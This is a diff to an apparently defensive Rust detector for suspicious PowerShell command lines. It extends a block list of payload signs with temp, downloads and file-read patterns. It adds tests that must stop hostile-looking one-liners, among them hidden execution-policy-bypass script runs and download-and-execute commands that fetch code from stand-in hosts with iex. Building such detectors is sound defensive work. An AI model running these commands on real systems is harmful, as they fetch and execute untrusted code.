@@ -87,6 +87,17 @@ const PAYLOAD_SIGNS: &[&str] = &[
     "[char",
     "-join",
     "-bxor",
+    // A script read from a file, or kept where any program can write.
+    "get-content",
+    "gc ",
+    "readalltext",
+    r"\appdata\",
+    r"\downloads\",
+    r"\desktop\",
+    r"\users\public\",
+    r"\windows\temp\",
+    "%temp%",
+    "$env:temp",
 ];
 
 /// Returns the first suspicious pattern for a script host, matching case- and
@@ -913,6 +924,10 @@ mod tests {
     #[test]
     fn a_weak_sign_with_another_or_with_something_fetched_or_decoded_is_stopped() {
         for line in [
+            r"powershell -w hidden -f C:\Users\x\AppData\Local\Temp\a.ps1",
+            r"powershell -ep bypass -File C:\Users\x\Downloads\evil.ps1",
+            r"powershell iex (gc C:\x\p.txt)",
+            r"powershell -WindowStyle Hidden -File %TEMP%\a.ps1",
             "powershell -c \"irm https://x.example/a.ps1 | iex\"",
             "powershell -c \"iwr http://x/a.ps1 -useb | iex\"",
             "powershell iex (New-Object Net.WebClient).DownloadString('http://x/a.ps1')",
